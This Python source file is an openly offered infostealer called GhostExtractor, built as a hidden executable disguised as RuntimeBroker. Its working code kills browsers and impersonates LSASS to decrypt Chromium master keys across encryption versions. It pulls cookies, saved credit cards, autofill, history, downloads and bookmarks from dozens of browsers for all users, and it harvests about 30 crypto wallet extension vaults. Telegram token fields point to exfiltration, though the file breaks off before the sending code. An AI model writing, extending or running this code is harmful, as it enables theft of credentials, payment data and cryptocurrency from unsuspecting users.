"""
GhostExtractor — Full-spectrum browser data extraction toolkit.

Silently discovers, decrypts, and exfiltrates cookies, passwords,
credit cards, autofill, history, bookmarks, and crypto wallet vaults
from 45+ Chromium and 10+ Gecko browsers on Windows.

Supports all Chromium encryption versions:
  v10/v11  — DPAPI + AES-256-GCM
  v20 flag 1 — AES-256-GCM (hardcoded key, Chrome <133)
  v20 flag 2 — ChaCha20-Poly1305 (hardcoded key, Chrome 133-136)
  v20 flag 3 — CNG Key Storage Provider + XOR (Chrome 137+)

Build:
  py -m PyInstaller --onefile --noconsole --clean --name RuntimeBroker ghost.py
"""

import sqlite3
import json
import os
import sys
import io
import winreg
import requests
import base64
import shutil
import zipfile
import binascii
import ctypes
import struct
import time
import threading

import windows
import windows.crypto
import windows.generated_def as gdef

from abc import ABC, abstractmethod
from contextlib import contextmanager
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from datetime import datetime
from uuid import uuid4

from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

SW_HIDE    = 0
TG_TOKEN   = ''
TG_CHAT_ID = ''

class Environment:
    """Centralized access to system paths and environment variables."""

    LOCAL   = os.getenv('LOCALAPPDATA', '')
    ROAMING = os.getenv('APPDATA', '')
    TEMP    = os.getenv('TEMP', os.getcwd())
    USER    = os.getlogin()

    @staticmethod
    def is_admin():
        """Check whether the current process has administrator privileges."""
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    @staticmethod
    def elevate():
        """Silent UAC elevation — SW_HIDE keeps the script window invisible."""
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, SW_HIDE
        )

        sys.exit()

    @classmethod
    def all_user_roots(cls):
        """
        Discover LOCALAPPDATA and APPDATA for every user on the system.

        Uses three strategies to ensure complete coverage:
          1. Current process environment variables
          2. Registry ProfileList enumeration
          3. Physical C:\\Users directory scan

        This solves the UAC elevation context switch where ShellExecuteW("runas")
        may run as a different admin account whose LOCALAPPDATA differs from the
        target user's.
        """
        seen = set()
        roots = []

        def _add(local, roaming):
            if local and os.path.isdir(local) and local not in seen:
                seen.add(local)
                roots.append({'local': local, 'roaming': roaming})

        _add(cls.LOCAL, cls.ROAMING)

        try:
            key = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList'
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as pk:
                for i in range(winreg.QueryInfoKey(pk)[0]):
                    try:
                        sid = winreg.EnumKey(pk, i)
                        with winreg.OpenKey(pk, sid) as sk:
                            profile_path = winreg.QueryValueEx(sk, 'ProfileImagePath')[0]
                            _add(
                                os.path.join(profile_path, 'AppData', 'Local'),
                                os.path.join(profile_path, 'AppData', 'Roaming'),
                            )
                    except Exception:
                        pass
        except Exception:
            pass

        system_drive = os.environ.get('SYSTEMDRIVE', 'C:')
        users_dir = os.path.join(system_drive, os.sep, 'Users')

        try:
            skip = ('public', 'default', 'default user', 'all users')
            for entry in os.scandir(users_dir):
                if entry.is_dir() and entry.name.lower() not in skip:
                    _add(
                        os.path.join(entry.path, 'AppData', 'Local'),
                        os.path.join(entry.path, 'AppData', 'Roaming'),
                    )
        except Exception:
            pass

        return roots


class TokenManager:
    """Handles LSASS process token impersonation for system-level DPAPI operations."""

    @staticmethod
    @contextmanager
    def impersonate_lsass():
        """
        Temporarily impersonate LSASS for system-level DPAPI decryption.

        Required for v20 App-Bound Encryption where the first DPAPI unwrap
        must happen in the SYSTEM security context. Always restores the
        original token and calls RevertToSelf as a safety net.
        """
        original = windows.current_thread.token

        try:
            windows.current_process.token.enable_privilege('SeDebugPrivilege')

            proc = next(
                p for p in windows.system.processes
                if p.name == 'lsass.exe'
            )

            impersonation_token = proc.token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation,
            )

            windows.current_thread.token = impersonation_token
            yield

        except GeneratorExit:
            raise
        except Exception:
            yield
        finally:
            try:
                windows.current_thread.token = original
            except Exception:
                pass

            try:
                ctypes.windll.advapi32.RevertToSelf()
            except Exception:
                pass


class FileOps:
    """Silent file operations using Win32 API — zero console windows."""

    @staticmethod
    def _silent_copy(src, dst):
        """Copy file using kernel32.CopyFileW — no cmd.exe spawned."""
        try:
            return bool(ctypes.windll.kernel32.CopyFileW(src, dst, False))
        except Exception:
            return False

    @staticmethod
    @contextmanager
    def temp_copy(src):
        """
        Copy source file to a temporary path, yield that path, always cleanup.

        Tries Win32 CopyFileW first (silent), falls back to shutil.copy2.
        Guarantees cleanup of the temp file and any SQLite sidecars.
        """
        dst = os.path.join(Environment.TEMP, f"_{uuid4().hex[:10]}")
        copied = False

        try:
            if FileOps._silent_copy(src, dst):
                copied = True
            else:
                try:
                    shutil.copy2(src, dst)
                    copied = True
                except Exception:
                    pass

            if copied:
                time.sleep(0.1)
                yield dst
            else:
                yield None

        except Exception:
            yield None

        finally:
            if copied:
                FileOps._cleanup(dst)

    @staticmethod
    def _cleanup(path, retries=4):
        """Remove temp files including SQLite WAL/journal/shm sidecars."""
        for ext in ('', '-wal', '-journal', '-shm'):
            target = path + ext
            for _ in range(retries):
                try:
                    if os.path.exists(target):
                        os.remove(target)
                    break
                except Exception:
                    time.sleep(0.1)


class DatabaseOps:
    """Thread-safe SQLite query execution with retry logic for locked databases."""

    @staticmethod
    def query(path, sql, retries=4):
        """
        Execute a read-only SQL query with automatic retries on database lock.

        Returns an empty list on failure rather than raising exceptions,
        allowing extraction to continue for other databases.
        """
        if not path or not os.path.exists(path):
            return []

        for attempt in range(retries):
            conn = None
            try:
                conn = sqlite3.connect(path, timeout=5, check_same_thread=False)
                return conn.execute(sql).fetchall()

            except sqlite3.OperationalError:
                if attempt < retries - 1:
                    time.sleep(0.25 * (attempt + 1))

            except Exception:
                break

            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass

        return []


class ProcessKiller:
    """Silent browser process termination via Win32 ToolHelp API."""

    TARGETS = {
        'chrome.exe', 'msedge.exe', 'brave.exe',
        'browser.exe', 'opera.exe', 'vivaldi.exe',
        'iridium.exe', 'chromium.exe', 'firefox.exe',
        'waterfox.exe', 'librewolf.exe', 'palemoon.exe',
        'basilisk.exe', 'floorp.exe',
        'service_update.exe', 'yandex_browser_service.exe',
        'opera_autoupdate.exe', 'BraveUpdate.exe',
        'GoogleUpdate.exe', 'MicrosoftEdgeUpdate.exe',
    }

    @classmethod
    def kill_all(cls):
        """
        Terminate all known browser processes using Win32 API.

        Uses CreateToolhelp32Snapshot + TerminateProcess instead of
        taskkill.exe to avoid spawning visible console windows.
        Includes browser update services that hold file locks.
        """
        try:
            PROCESS_TERMINATE = 0x0001
            TH32CS_SNAPPROCESS = 0x00000002

            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ('dwSize', ctypes.c_ulong),
                    ('cntUsage', ctypes.c_ulong),
                    ('th32ProcessID', ctypes.c_ulong),
                    ('th32DefaultHeapID', ctypes.POINTER(ctypes.c_ulong)),
                    ('th32ModuleID', ctypes.c_ulong),
                    ('cntThreads', ctypes.c_ulong),
                    ('th32ParentProcessID', ctypes.c_ulong),
                    ('pcPriClassBase', ctypes.c_long),
                    ('dwFlags', ctypes.c_ulong),
                    ('szExeFile', ctypes.c_char * 260),
                ]

            kernel32 = ctypes.windll.kernel32
            snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

            if snapshot == -1:
                return

            entry = PROCESSENTRY32()
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

            if kernel32.Process32First(snapshot, ctypes.byref(entry)):
                while True:
                    try:
                        name = entry.szExeFile.decode('utf-8', errors='ignore').lower()

                        if name in cls.TARGETS:
                            handle = kernel32.OpenProcess(
                                PROCESS_TERMINATE, False, entry.th32ProcessID
                            )
                            if handle:
                                kernel32.TerminateProcess(handle, 0)
                                kernel32.CloseHandle(handle)
                    except Exception:
                        pass

                    if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                        break

            kernel32.CloseHandle(snapshot)

        except Exception:
            pass

        time.sleep(1)


class CngDecryptor:
    """
    Windows CNG (Cryptography Next Generation) decryption.

    For v20 flag 3/135 (Chrome 137+), the AES key is stored in the
    CNG Key Storage Provider under a browser-specific key name.
    This class tries the mapped name first, then Chrome/Chromium fallbacks.
    """

    PROVIDER = 'Microsoft Software Key Storage Provider'

    KEY_MAP = {
        'chrome':           'Google Chromekey1',
        'chrome-beta':      'Google Chrome Betakey1',
        'chrome-dev':       'Google Chrome Devkey1',
        'chrome-sxs':       'Google Chrome SxSkey1',
        'edge':             'Microsoft Edgekey1',
        'edge-beta':        'Microsoft Edge Betakey1',
        'edge-dev':         'Microsoft Edge Devkey1',
        'brave':            'Brave Browserkey1',
        'brave-beta':       'Brave Browser Betakey1',
        'brave-nightly':    'Brave Browser Nightlykey1',
        'vivaldi':          'Vivaldi Browserkey1',
        'opera':            'Opera Stablekey1',
        'opera-gx':         'Opera GX Stablekey1',
        'opera-beta':       'Opera Nextkey1',
        'opera-developer':  'Opera Developerkey1',
        'yandex':           'Yandex YandexBrowserkey1',
        'avast':            'Avast Browserkey1',
        'avg':              'AVG Browserkey1',
        'whale':            'Naver Whalekey1',
        'coccoc':           'CocCoc Browserkey1',
        'iridium':          'Iridiumkey1',
        'chromium':         'Chromiumkey1',
    }

    FALLBACK_KEYS = ['Google Chromekey1', 'Chromiumkey1']

    @classmethod
    def get_key_names(cls, browser_name):
        """Return an ordered list of CNG key names to attempt for the given browser."""
        candidates = []

        mapped = cls.KEY_MAP.get(browser_name)
        if mapped:
            candidates.append(mapped)

        for fallback in cls.FALLBACK_KEYS:
            if fallback not in candidates:
                candidates.append(fallback)

        return candidates

    @classmethod
    def decrypt(cls, data, browser_name='chrome'):
        """Attempt decryption with browser-specific key, then fallbacks."""
        for key_name in cls.get_key_names(browser_name):
            result = cls._try_decrypt(data, key_name)
            if result is not None:
                return result
        return None

    @classmethod
    def _try_decrypt(cls, data, key_name):
        """Single CNG decryption attempt with a specific key name."""
        try:
            ncrypt = ctypes.windll.NCRYPT

            hprov = gdef.NCRYPT_PROV_HANDLE()
            if ncrypt.NCryptOpenStorageProvider(ctypes.byref(hprov), cls.PROVIDER, 0) != 0:
                return None

            hkey = gdef.NCRYPT_KEY_HANDLE()
            if ncrypt.NCryptOpenKey(hprov, ctypes.byref(hkey), key_name, 0, 0) != 0:
                ncrypt.NCryptFreeObject(hprov)
                return None

            ibuf = (ctypes.c_ubyte * len(data)).from_buffer_copy(data)
            cb = gdef.DWORD(0)

            ncrypt.NCryptDecrypt(hkey, ibuf, len(ibuf), None, None, 0, ctypes.byref(cb), 0x40)

            if cb.value == 0:
                ncrypt.NCryptFreeObject(hkey)
                ncrypt.NCryptFreeObject(hprov)
                return None

            obuf = (ctypes.c_ubyte * cb.value)()
            status = ncrypt.NCryptDecrypt(
                hkey, ibuf, len(ibuf), None, obuf, cb.value, ctypes.byref(cb), 0x40
            )

            ncrypt.NCryptFreeObject(hkey)
            ncrypt.NCryptFreeObject(hprov)

            return bytes(obuf[:cb.value]) if status == 0 else None

        except Exception:
            return None


class MasterKeyExtractor:
    """
    Extracts Chromium master encryption keys across all known versions.

    Decryption chain:
      v10/v11 — DPAPI with encrypted_key (universal across all Chromium)
      v20 flag 1 — AES-256-GCM with hardcoded key (Chrome <133)
      v20 flag 2 — ChaCha20-Poly1305 with hardcoded key (Chrome 133-136)
      v20 flag 3/135 — CNG KSP + XOR derivation (Chrome 137+)
      Non-Chrome fallback — raw DPAPI-decrypted last 32 bytes as key
    """

    _V20_KEYS = {
        1: ('aesgcm',  'B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787'),
        2: ('chacha',  'E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660'),
    }

    _XOR_KEY = bytes.fromhex(
        'CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390'
    )

    @classmethod
    def read_local_state(cls, ls_path):
        """Read and parse Local State JSON via silent temp copy."""
        with FileOps.temp_copy(ls_path) as tmp:
            if not tmp:
                return None
            try:
                with open(tmp, 'rb') as f:
                    return json.loads(f.read())
            except Exception:
                return None

    @classmethod
    def extract(cls, ls_path, v20=False, browser_name='chrome'):
        """Extract master key from Local State file."""
        data = cls.read_local_state(ls_path)
        if not data:
            return None

        if v20:
            return cls._extract_v20(data, browser_name)

        return cls._extract_v10(data)

    @classmethod
    def has_v20(cls, data):
        """Check whether Local State contains an app-bound encryption key."""
        return bool(data and data.get('os_crypt', {}).get('app_bound_encrypted_key'))

    @classmethod
    def _extract_v10(cls, data):
        """Extract v10/v11 master key via DPAPI — universal across all Chromium."""
        try:
            encrypted_key = data.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key:
                return None

            key_material = base64.b64decode(encrypted_key)[5:]
            result = CryptUnprotectData(key_material, None, None, None, 0)

            return result[1] if result and result[1] else None

        except Exception:
            return None

    @classmethod
    def _extract_v20(cls, data, browser_name='chrome'):
        """
        Extract v20 app-bound master key.

        Flow: LSASS impersonation → SYSTEM DPAPI → USER DPAPI → blob parse → derive.
        Falls back to using the raw last 32 bytes for non-Chrome browsers
        with simplified ABE implementations.
        """
        try:
            abek = data.get('os_crypt', {}).get('app_bound_encrypted_key')
            if not abek:
                return None

            raw = binascii.a2b_base64(abek)
            if raw[:4] != b'APPB':
                return None

            with TokenManager.impersonate_lsass():
                system_decrypted = windows.crypto.dpapi.unprotect(raw[4:])

            user_decrypted = windows.crypto.dpapi.unprotect(system_decrypted)

            blob = cls._parse_blob(user_decrypted)
            if blob:
                derived = cls._derive_v20(blob, browser_name)
                if derived:
                    return derived

            if len(user_decrypted) >= 32:
                return user_decrypted[-32:]

            return None

        except Exception:
            return None

    @classmethod
    def _parse_blob(cls, blob):
        """Parse a v20 key blob into its constituent cryptographic fields."""
        try:
            buf = io.BytesIO(blob)
            result = {}

            header_len = struct.unpack('<I', buf.read(4))[0]
            result['header'] = buf.read(header_len)

            content_len = struct.unpack('<I', buf.read(4))[0]
            if header_len + content_len + 8 > len(blob):
                return None

            result['flag'] = buf.read(1)[0]

            if result['flag'] in (3, 135):
                result['aes_enc'] = buf.read(32)
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)

            elif result['flag'] in (1, 2):
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)

            else:
                buf.seek(-60, io.SEEK_END)
                result['iv']  = buf.read(12)
                result['ct']  = buf.read(32)
                result['tag'] = buf.read(16)

            return result

        except Exception:
            return None

    @classmethod
    def _derive_v20(cls, parsed, browser_name='chrome'):
        """Derive the final v20 AES key using flag-dependent decryption."""
        try:
            flag = parsed.get('flag')
            cipher = None

            if flag in cls._V20_KEYS:
                algo, hex_key = cls._V20_KEYS[flag]
                key_bytes = bytes.fromhex(hex_key)
                cipher = AESGCM(key_bytes) if algo == 'aesgcm' else ChaCha20Poly1305(key_bytes)

            elif flag in (3, 135):
                with TokenManager.impersonate_lsass():
                    decrypted_aes = CngDecryptor.decrypt(parsed['aes_enc'], browser_name)

                if not decrypted_aes:
                    return None

                xored = bytes(a ^ b for a, b in zip(decrypted_aes, cls._XOR_KEY))
                cipher = AESGCM(xored)

            if not cipher:
                return None

            return cipher.decrypt(parsed['iv'], parsed['ct'] + parsed['tag'], None)

        except Exception:
            return None


class CookieDecryptor:
    """
    Decrypts Chromium-encrypted values through a cascading fallback chain.

    Handles browser-specific quirks:
      Chrome v20 — 32-byte validation header before the actual value
      Brave v20  — sometimes omits the 32-byte header entirely
      Yandex v10 — prepends 32 bytes of binary metadata before the value
    """

    @staticmethod
    def _decode_value(raw):
        """
        Decode decrypted bytes to string, handling binary metadata prefixes.

        Tries clean UTF-8 first. If that fails (binary prefix), skips
        32 bytes and retries. Final fallback strips non-UTF8 bytes.
        """
        if not raw:
            return ""

        try:
            return raw.decode('utf-8')
        except UnicodeDecodeError:
            pass

        if len(raw) > 32:
            try:
                return raw[32:].decode('utf-8')
            except UnicodeDecodeError:
                pass

        return raw.decode('utf-8', errors='ignore').strip('\x00')

    @staticmethod
    def decrypt(buff, master_key=None, v20_key=None):
        """
        Attempt decryption in priority order:
          1. AES-GCM with v10/v11 master key
          2. AESGCM with v20 master key (handles Brave header quirk)
          3. Raw DPAPI fallback for legacy cookies
        """
        if not buff:
            return ""

        if buff[:3] in (b'v10', b'v11') and master_key:
            try:
                iv  = buff[3:15]
                ct  = buff[15:-16]
                tag = buff[-16:]
                raw = AES.new(master_key, AES.MODE_GCM, iv).decrypt_and_verify(ct, tag)
                return CookieDecryptor._decode_value(raw)
            except Exception:
                pass

        if buff[:3] == b'v20' and v20_key:
            try:
                iv  = buff[3:15]
                ct  = buff[15:-16]
                tag = buff[-16:]
                raw = AESGCM(v20_key).decrypt(iv, ct + tag, None)

                if len(raw) > 32:
                    value = CookieDecryptor._decode_value(raw[32:])
                    if value:
                        return value

                return CookieDecryptor._decode_value(raw)
            except Exception:
                pass

        try:
            raw = CryptUnprotectData(buff, None, None, None, 0)[1]
            return CookieDecryptor._decode_value(raw)

        except Exception:
            return ""


class PathDiscovery:
    """
    Discovers browser data directories across ALL user profiles.

    Three strategies layered for maximum coverage:
      1. Known hardcoded paths (45+ Chromium + 10 Gecko variants)
      2. Windows Registry scan (HKCU / HKLM / WOW6432Node)
      3. Filesystem sweep of every user's LOCALAPPDATA and APPDATA
    """

    CHROMIUM_PATHS = {
        'chrome':            ('local',   'Google\\Chrome\\User Data'),
        'chrome-beta':       ('local',   'Google\\Chrome Beta\\User Data'),
        'chrome-dev':        ('local',   'Google\\Chrome Dev\\User Data'),
        'chrome-sxs':        ('local',   'Google\\Chrome SxS\\User Data'),
        'edge':              ('local',   'Microsoft\\Edge\\User Data'),
        'edge-beta':         ('local',   'Microsoft\\Edge Beta\\User Data'),
        'edge-dev':          ('local',   'Microsoft\\Edge Dev\\User Data'),
        'brave':             ('local',   'BraveSoftware\\Brave-Browser\\User Data'),
        'brave-beta':        ('local',   'BraveSoftware\\Brave-Browser-Beta\\User Data'),
        'brave-nightly':     ('local',   'BraveSoftware\\Brave-Browser-Nightly\\User Data'),
        'vivaldi':           ('local',   'Vivaldi\\User Data'),
        'yandex':            ('local',   'Yandex\\YandexBrowser\\User Data'),
        'opera':             ('roaming', 'Opera Software\\Opera Stable'),
        'opera-gx':          ('roaming', 'Opera Software\\Opera GX Stable'),
        'opera-beta':        ('roaming', 'Opera Software\\Opera Next'),
        'opera-developer':   ('roaming', 'Opera Software\\Opera Developer'),
        'iridium':           ('local',   'Iridium\\User Data'),
        'chromium':          ('local',   'Chromium\\User Data'),
        'slimjet':           ('local',   'Slimjet\\User Data'),
        'epic':              ('local',   'Epic Privacy Browser\\User Data'),
        'amigo':             ('local',   'Amigo\\User Data'),
        'torch':             ('local',   'Torch\\User Data'),
        'kometa':            ('local',   'Kometa\\User Data'),
        'orbitum':           ('local',   'Orbitum\\User Data'),
        'cent':              ('local',   'CentBrowser\\User Data'),
        '7star':             ('local',   '7Star\\7Star\\User Data'),
        'sputnik':           ('local',   'Sputnik\\Sputnik\\User Data'),
        'uran':              ('local',   'uCozMedia\\Uran\\User Data'),
        'coccoc':            ('local',   'CocCoc\\Browser\\User Data'),
        'superbird':         ('local',   'Superbird\\User Data'),
        'dragon':            ('local',   'Comodo\\Dragon\\User Data'),
        'whale':             ('local',   'Naver\\Naver Whale\\User Data'),
        'avast':             ('local',   'AVAST Software\\Browser\\User Data'),
        'avg':               ('local',   'AVG\\Browser\\User Data'),
        'ccleaner':          ('local',   'CCleaner\\CCleaner Browser\\User Data'),
        'ghostery':          ('local',   'Ghostery\\User Data'),
    }

    GECKO_ROOTS = [
        ('Mozilla',               'Firefox'),
        ('Waterfox',              ''),
        ('librewolf',             ''),
        ('Moonchild Productions', 'Pale Moon'),
        ('Moonchild Productions', 'Basilisk'),
        ('Comodo',                'IceDragon'),
        ('Floorp',                ''),
        ('Mullvad',               'Mullvad Browser'),
        ('Zen Browser',           ''),
        ('Mercury',               ''),
    ]

    @classmethod
    def chromium(cls):
        """Discover all Chromium-based browser data directories."""
        found = {}

        for user_root in Environment.all_user_roots():
            for name, (scope, rel) in cls.CHROMIUM_PATHS.items():
                full = os.path.join(user_root[scope], rel)
                local_state = os.path.join(full, 'Local State')

                if os.path.exists(local_state) and full not in found.values():
                    key = name if name not in found else f'{name}_{len(found)}'
                    found[key] = full

        cls._scan_registry(found)
        cls._scan_filesystem(found)

        return found

    @classmethod
    def gecko(cls):
        """Discover all Gecko-based browser cookie databases."""
        results = []

        for user_root in Environment.all_user_roots():
            for vendor, product in cls.GECKO_ROOTS:
                for root in (user_root.get('roaming', ''), user_root.get('local', '')):
                    if not root:
                        continue

                    parts = [root, vendor]
                    if product:
                        parts.append(product)
                    parts.append('Profiles')

                    profiles_dir = os.path.join(*parts)
                    if not os.path.isdir(profiles_dir):
                        continue

                    try:
                        for entry in os.scandir(profiles_dir):
                            if not entry.is_dir():
                                continue

                            cookie_db = os.path.join(entry.path, 'cookies.sqlite')
                            if os.path.exists(cookie_db):
                                browser_name = (
                                    product.lower().replace(' ', '-')
                                    if product else vendor.lower()
                                )
                                if not any(r[2] == cookie_db for r in results):
                                    results.append((browser_name, entry.name, cookie_db))
                    except Exception:
                        pass

        return results

    @classmethod
    def _scan_registry(cls, found):
        """Scan Windows registry for additional Chromium browser installations."""
        hives = [
            (winreg.HKEY_CURRENT_USER,  'Software'),
            (winreg.HKEY_LOCAL_MACHINE, 'Software'),
            (winreg.HKEY_LOCAL_MACHINE, 'Software\\WOW6432Node'),
        ]

        for hive, base in hives:
            try:
                with winreg.OpenKey(hive, base) as base_key:
                    for i in range(winreg.QueryInfoKey(base_key)[0]):
                        try:
                            vendor = winreg.EnumKey(base_key, i)

                            with winreg.OpenKey(base_key, vendor) as vendor_key:
                                for j in range(winreg.QueryInfoKey(vendor_key)[0]):
                                    try:
                                        product = winreg.EnumKey(vendor_key, j)

                                        with winreg.OpenKey(vendor_key, product) as product_key:
                                            try:
                                                user_data = winreg.QueryValueEx(
                                                    product_key, 'UserDataDir'
                                                )[0]

                                                local_state = os.path.join(user_data, 'Local State')
                                                if os.path.exists(local_state) and user_data not in found.values():
                                                    key = f'reg-{vendor}-{product}'.lower()[:48]
                                                    found[key] = user_data
                                            except Exception:
                                                pass
                                    except Exception:
                                        pass
                        except Exception:
                            pass
            except Exception:
                pass

    @classmethod
    def _scan_filesystem(cls, found):
        """Walk all users' AppData for undiscovered Chromium installations."""
        for user_root in Environment.all_user_roots():
            for root_dir in (user_root.get('local', ''), user_root.get('roaming', '')):
                if not root_dir or not os.path.isdir(root_dir):
                    continue

                try:
                    for entry in os.scandir(root_dir):
                        if not entry.is_dir():
                            continue

                        for subpath in (entry.path, os.path.join(entry.path, 'User Data')):
                            local_state = os.path.join(subpath, 'Local State')

                            if os.path.exists(local_state) and subpath not in found.values():
                                found[f'scan-{entry.name}'.lower()] = subpath
                except Exception:
                    pass



class DataExtractor:
    """
    Extracts supplementary browser data: autofill, credit cards,
    history, downloads, bookmarks, and crypto wallet extension vaults.
    """

    WALLET_EXTENSIONS = {
        'metamask':         'nkbihfbeogaeaoehlefnkodbefgpgknn',
        'coinbase':         'hnfanknocfeofbddgcijnmhnfnkdnaad',
        'phantom':          'bfnaelmomeimhlpmgjnjophhpkkoljpa',
        'tronlink':         'ibnejdfjmmkpcnlpebklmnkoeoihofec',
        'trust':            'egjidjbpglichdcondbcbdnbeeppgdph',
        'okx':              'mcohilncbfahbmgdjkbpemcciiolgcge',
        'keplr':            'dmkamcknogkgcdfhhbddcghachkejeap',
        'bnb-chain':        'fhbohimaelbohpjbbldcngcnapndodjp',
        'braavos':          'jnlgamecbpmbajjfhmmmlhejkemejdma',
        'manta':            'enabgbdfcbaehmbigakijjabdpdnimlg',
        'math':             'afbcbjpbpfadlkmhmclhkeeodmamcflc',
        'ronin':            'fnjhmkhhmkbjkkabndcnnogagogbneec',
        'exodus':           'aholpfdialjgjfhomihkjbmgjidlcdno',
        'rabby':            'acmacodkjbdgmoleebolmdjonilkdbch',
        'brave-wallet':     'odbfpeeihdkbihmopkbjmoonfanlbfcl',
        'tokenpocket':      'mfgccjchihfkkindfppnaooecgfneiii',
        'bitget':           'jiidiaalihmmhddjgbnbgdffknnlceai',
        'sui':              'opcgpfmipidbgpenhmajoajpbobppdil',
        'leap':             'fcfcfllfndlomdhbehjjcoimbgofdncg',
        'station':          'aiifbnbfobpmeekipheeijimdpnlpgpp',
        'compass':          'anokgmphncpekkhclmingpimjmcooifb',
        'conflux':          'djhangpaibgoanolfdamjpigcaijdlah',
        'plug':             'cfbfdhimifdmdehjmkdobpcjfefblkjm',
        'coin98':           'aeachknmefphepccionboohckonoeemg',
        'xdefi':            'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
        'clover':           'nhnkbkgjikgcigadomkphalanndcapjk',
        'yoroi':            'ffnbelfdoeiohenkjibnmadjiehjhajb',
        'solflare':         'bhhhlbepdkbapadjdcodbhkbmljfand',
        'slope':            'pocmplpaccanhmnllbbkpgfliimjahi',
    }

    CHROME_EPOCH_OFFSET = 11644473600
    WALLET_SKIP_FILES = {'LOCK', 'LOG', 'CURRENT'}

    @classmethod
    def extract_credit_cards(cls, profile_path, master_key, v20_key):
        """Extract and decrypt credit card data from Web Data SQLite."""
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return []

        try:
            with FileOps.temp_copy(web_data) as tmp:
                if not tmp:
                    return []

                rows = DatabaseOps.query(tmp, '''
                    SELECT name_on_card, expiration_month, expiration_year,
                           card_number_encrypted, date_modified, origin
                    FROM credit_cards
                ''')

                cards = []
                for row in rows:
                    name       = row[0] or ''
                    month      = row[1] or 0
                    year       = row[2] or 0
                    enc_number = row[3]
                    origin     = row[5] or ''

                    number = ''
                    if enc_number:
                        number = CookieDecryptor.decrypt(enc_number, master_key, v20_key)

                    if number or name:
                        cards.append({
                            'name': name, 'number': number,
                            'month': month, 'year': year, 'origin': origin,
                        })

                return cards

        except Exception:
            return []

    @classmethod
    def extract_autofill(cls, profile_path):
        """Extract autofill form data from Web Data SQLite."""
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return []

        try:
            with FileOps.temp_copy(web_data) as tmp:
                if not tmp:
                    return []

                rows = DatabaseOps.query(tmp, '''
                    SELECT name, value, count, date_last_used
                    FROM autofill
                    WHERE value != ''
                    ORDER BY count DESC
                ''')

                return [
                    {'field': r[0], 'value': r[1], 'count': r[2], 'last_used': r[3]}
                    for r in rows if r[0] and r[1]
                ]

        except Exception:
            return []

    @classmethod
    def extract_history(cls, profile_path, limit=5000):
        """Extract browsing history from History SQLite."""
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return []

        try:
            with FileOps.temp_copy(history_db) as tmp:
                if not tmp:
                    return []

                rows = DatabaseOps.query(tmp, f'''
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT {limit}
                ''')

                results = []
                for url, title, visits, last_visit in rows:
                    timestamp = 0
                    if last_visit:
                        timestamp = max(0, (last_visit // 1000000) - cls.CHROME_EPOCH_OFFSET)

                    results.append({
                        'url': url or '', 'title': title or '',
                        'visits': visits or 0, 'last_visit': timestamp,
                    })

                return results

        except Exception:
            return []

    @classmethod
    def extract_downloads(cls, profile_path, limit=1000):
        """Extract download history from History SQLite."""
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return []

        try:
            with FileOps.temp_copy(history_db) as tmp:
                if not tmp:
                    return []

                rows = DatabaseOps.query(tmp, f'''
                    SELECT target_path, tab_url, total_bytes,
                           start_time, end_time, mime_type
                    FROM downloads
                    ORDER BY start_time DESC
                    LIMIT {limit}
                ''')

                results = []
                for path, url, size, start, end, mime in rows:
                    timestamp = 0
                    if start:
                        timestamp = max(0, (start // 1000000) - cls.CHROME_EPOCH_OFFSET)

                    results.append({
                        'path': path or '', 'url': url or '',
                        'size': size or 0, 'time': timestamp, 'mime': mime or '',
                    })

                return results

        except Exception:
            return []

    @classmethod
    def extract_bookmarks(cls, profile_path):
        """Extract bookmarks from Bookmarks JSON file — no encryption."""
        bookmarks_file = os.path.join(profile_path, 'Bookmarks')
        if not os.path.exists(bookmarks_file):
            return []

        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                data = json.loads(f.read())

            bookmarks = []
            cls._walk_bookmarks(data.get('roots', {}), bookmarks)
            return bookmarks

        except Exception:
            return []

    @classmethod
    def _walk_bookmarks(cls, node, results, folder=''):
        """Recursively walk the bookmark tree collecting URLs."""
        if isinstance(node, dict):
            if node.get('type') == 'url':
                results.append({
                    'name':   node.get('name', ''),
                    'url':    node.get('url', ''),
                    'folder': folder,
                })

            for child in node.get('children', []):
                cls._walk_bookmarks(child, results, node.get('name', folder))

            for key, val in node.items():
                if isinstance(val, dict) and key not in ('meta_info', 'sync_metadata'):
                    cls._walk_bookmarks(val, results, key)

    @classmethod
    def extract_wallets(cls, profile_path):
        """
        Extract ALL LevelDB files from known wallet extension directories.

        Scans three storage locations per wallet:
          1. Local Extension Settings (primary)
          2. IndexedDB (used by newer extensions like Exodus Web3)
          3. Sync Extension Settings (synced data)

        Skips LOCK/LOG/CURRENT files to avoid PermissionError crashes.
        Does NOT pattern-match vault content — just grabs everything.
        """
        wallets = {}

        storage_dirs = [
            ('local',     os.path.join(profile_path, 'Local Extension Settings')),
            ('indexeddb',  os.path.join(profile_path, 'IndexedDB')),
            ('sync',      os.path.join(profile_path, 'Sync Extension Settings')),
        ]

